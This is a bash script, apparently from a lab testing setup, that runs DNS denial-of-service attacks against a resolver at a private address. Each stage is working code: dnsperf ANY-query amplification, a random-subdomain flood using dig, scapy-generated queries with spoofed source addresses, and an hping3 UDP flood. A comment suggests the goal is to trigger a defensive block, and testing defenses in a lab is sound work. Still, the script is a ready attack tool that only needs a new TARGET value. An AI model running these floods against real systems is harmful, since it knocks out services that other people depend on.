#!/bin/bash
# Top layer: DNS amplification, flood and reflection against the resolver.
set -euo pipefail
source "$(dirname "$0")/lib.sh"

TARGET="${TARGET:-10.0.1.2}"
ZONE="${ZONE:-cyberstuff.local}"
# The host's own address is whitelisted, so set SPOOF_SOURCE to an address that
# is not, to see a block installed.
SPOOF_SOURCE="${SPOOF_SOURCE:-}"
spoof=""
[ -n "${SPOOF_SOURCE}" ] && spoof="-a ${SPOOF_SOURCE}"

need hping3
need dig
echo "attacking DNS ${TARGET} for ${DURATION}s"

if command -v dnsperf >/dev/null; then
  QUERYFILE=$(mktemp)
  for _ in $(seq 200); do printf '%s ANY\n' "${ZONE}"; done > "${QUERYFILE}"
  launch "dnsperf amplification" dnsperf -s "${TARGET}" -d "${QUERYFILE}" -c 50 -l "${DURATION}"
else
  echo "  dnsperf absent, skipping the amplification stream"
fi

launch "random-subdomain flood" bash -c "
  while true; do
    dig @${TARGET} \$(head -c8 /dev/urandom | od -An -tx1 | tr -d ' ').${ZONE} \
        +short +tries=1 +time=1
  done"

if python3 -c "import scapy" 2>/dev/null; then
  launch "scapy spoofed queries" python3 -c "
from scapy.all import IP, UDP, DNS, DNSQR, send
import random
def pkt():
    return (IP(src='10.0.1.%d' % random.randint(20, 250), dst='${TARGET}')
            / UDP(dport=53) / DNS(rd=1, qd=DNSQR(qname='${ZONE}', qtype='ANY')))
while True:
    send(pkt(), verbose=0)
"
else
  echo "  scapy absent, skipping the reflection stream"
fi

launch "hping3 udp flood" hping3 ${spoof} -2 --flood -p 53 "${TARGET}"

finish
